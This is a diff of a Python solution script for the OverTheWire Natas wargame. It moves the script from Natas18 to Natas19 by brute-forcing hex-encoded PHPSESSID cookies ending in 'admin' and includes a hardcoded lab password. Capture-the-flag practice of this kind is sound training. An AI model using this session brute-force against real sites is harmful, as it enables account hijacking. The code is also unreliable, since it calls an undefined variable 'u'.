@@ -26,18 +26,32 @@ def log_found_inline(message):
 
 # ======================= 
 # === CONFIG === 
-url = "http://natas19.natas.labs.overthewire.org/"
+url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
 username = "natas19"
-natas18_password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
+natas19_password = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
 phpsesidMax = 640
 phpsesidMin = 1
 # =============
 
-log_info("Starting brute-force on natas18...")
+log_info("Starting brute-force on natas19...")
 
-for sesID in range(phpsesidMin, phpsesidMax + 1):
-    # Show inline progress
-    log_progress_inline(f"Trying PHPSESSID={sesID}") cookies = {"PHPSESSID": str(sesID)} response = requests.get(url, cookies=cookies, auth=(username, natas18_password)) if "You are an admin" in response.text: # Extract password match = re.search(r"Password:\s*(\S+)", response.text)
-        if match:
-            password = match.group(1)
-            log_found_inline(f"Admin session found! PHPSESSID={sesID}") log_success(f"Natas19 password: {password}") break
+while phpsesidMin <= phpsesidMax:
+
+    adminHex = "61646d696e"
+    stringHex = "".join("{:02x}".format(ord(c)) for c in str(phpsesidMin)) + adminHex
+
+    sesID = "PHPSESSID=" + stringHex 
+    log_progress_inline(sesID)
+
+    headers = {'Cookie': sesID}
+    response = requests.get(u,headers=headers, auth=(username,natas19_password),verify=False)
+
+    if "You are an admin" in response.text:
+        print(response.text)
+
+    phpsesidMin = phpsesidMin + 1
+log_success("done")
+
+
+
+
